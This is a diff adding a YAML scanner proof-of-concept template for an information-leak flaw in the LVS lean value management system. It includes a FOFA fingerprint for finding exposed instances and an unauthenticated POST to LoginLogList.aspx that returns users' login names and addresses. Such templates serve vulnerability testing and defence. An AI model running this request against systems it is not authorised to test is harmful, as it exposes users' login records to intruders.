@@ -1,0 +1,22 @@
+id: poc-yaml-lvms-loginloglist-aspx-info-leak
+info:
+  name: LVS精益价值管理系统 LoginLogList.aspx 信息泄露漏洞
+  severity: high
+  tags:
+  - 信息泄露
+  finger: LVS精益价值管理系统
+  fofa: body="/ajax/LVS.Core.Common.STSResult,LVS.Core.Common.ashx"
+requests:
+- method: GET
+  path: /Business/UserLogin.aspx
+  expression: status_code == 200 && contains(body,"LVS精益价值管理系统")
+- method: POST
+  path: /Business/BaseData/Org/LoginLogList.aspx?Type=BindGrid
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: page=1&pagesize=20
+  expression: "status_code == 200 && \ncontains(body,\"Loginadrress\") &&\ncontains(body,\"\
+    LoginName\") &&\ncontains(body,\"正常登录\") &&\n!contains(body,\"<\") &&\n!contains(body,\"\
+    /Business/UserLogin.aspx?tar=UnKnowUser\")\n"
+variables: {}
+transport: http
